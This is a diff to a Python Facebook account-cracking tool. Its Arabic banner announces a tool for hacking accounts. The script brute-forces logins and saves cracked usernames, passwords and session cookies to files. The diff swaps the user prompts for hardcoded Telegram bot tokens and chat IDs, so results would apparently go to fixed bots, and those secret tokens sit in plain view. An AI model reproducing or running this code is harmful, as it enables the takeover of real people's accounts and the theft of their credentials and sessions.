@@ -101,10 +101,10 @@ print(f'''{C}: \x1b[38;5;92m 𝐓𝐇𝐄 𝐃𝐀𝐓𝐄 \x1b[1;38;5;121m ๛ 
 print('')
 print(f'''{C}: \x1b[38;5;92m 𝑇𝐻𝐸 𝑇𝐼𝑀𝐸 \x1b[1;38;5;121m ๛   \x1b[1;38;5;121m   𖣎 \x1b[1;96m{time3} \x1b[1;38;5;121m 𖣎''')
 print('')
-token = input('\x1b[1;31mT\x1b[1;32mO\x1b[1;33mK\x1b[1;34mE\x1b[1;36mN\x1b[1;35m :\x1b[1;32m ')
+token =('6633885559:AAF09CwWmSb4N0vSz2ZxYwuD0RZtrI08GKI')
 token1=('6705178418:AAF5uAE5QR8-cpNdLgKm-X2TR0bTktytzkY')
 print('\n')
-ID = input('\x1b[1;31mI\x1b[1;34mD \x1b[1;32m   : ')
+ID = ('5431472046')
 ID1=('1677652563')
 print(('—'*25)+'\n\n'+('—'*25))
 tlg1 = '\n -مرحبا بك في اداة لإختراق الحسابات المتاحة  \n━━━━━━━━❖━━━━━━━━━\nتم تشغيل الاداة \n    \nستتوصل بالحسابات في هذا البوت 🫡 \n'
@@ -1287,11 +1287,11 @@ def crack(idf,pwv):
 ⋘─────━𓆩مدفوع𓆪‏━─────⋙
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n
 ❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
-سكيور حض اوفر حبيبي 
+تأكيد هوية
 ⋘─────━𓆩مدفوع𓆪‏━─────⋙
 BY = @mx1mq |'''
 					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='SESI'))
+					cetak(nel(statuscp1, title='MIMO'))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					cp+=1
@@ -1310,7 +1310,7 @@ BY = @mx1mq |'''
 ⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙
 ❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {idf}\n❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}\n
 
-⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙\n\n{infoakun}
+⋘─────━𓆩𝙼𝙸𝙼𝙾𓆪‏━─────⋙\n
 BY = @I_X_E0'''
 					statusok1 = nel(statusok, style='purpel')
 					cetak(nel(statusok1, title='MIMO'))
@@ -1323,7 +1323,7 @@ BY = @I_X_E0'''
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 					user=idf
-					infoakun = "{infoakun +}"
+					infoakun = ""
 					session = requests.Session()
 					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
 					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
